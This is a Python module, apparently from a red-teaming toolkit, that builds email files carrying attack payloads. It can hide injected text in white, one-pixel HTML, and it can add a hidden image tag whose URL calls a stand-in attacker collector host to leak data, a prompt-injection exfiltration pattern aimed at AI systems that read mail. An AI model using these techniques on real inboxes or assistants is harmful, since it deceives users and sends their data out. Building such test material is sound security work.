"""EML message generation."""

from email.message import EmailMessage
from pathlib import Path

from maldoc.attacks.base import AttackResult


def generate_eml(attack_result: AttackResult, title: str, output_path: Path) -> Path:
    """Generate an RFC 822 email file containing attack content."""
    msg = EmailMessage()
    msg["From"] = "sender@example.com"
    msg["To"] = "recipient@example.com"
    msg["Subject"] = title

    msg.set_content(attack_result.visible_content)

    if attack_result.metadata:
        msg["X-Author"] = attack_result.metadata.get("author", "")
        msg["X-Subject-Tag"] = attack_result.metadata.get("subject", "")
        msg["X-Keywords"] = attack_result.metadata.get("keywords", "")
        msg["X-Description"] = attack_result.metadata.get("description", "")

    hints = attack_result.format_hints or {}
    if attack_result.technique == "white_on_white":
        html = (
            "<html><body>"
            f"<div>{attack_result.visible_content}</div>"
            f'<span style="color:#fff;font-size:1px">{attack_result.hidden_content}</span>'
            "</body></html>"
        )
        msg.add_alternative(html, subtype="html")
    elif attack_result.technique == "markdown_exfil":
        exfil_url = hints.get("exfil_url", "https://collector.attacker.invalid/collect?data={LEAK}")
        html = (
            "<html><body>"
            f"<div>{attack_result.visible_content}</div>"
            f'<img src="{exfil_url}" alt="tracking" style="display:none" />'
            "</body></html>"
        )
        msg.add_alternative(html, subtype="html")

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(msg.as_bytes())
    return output_path
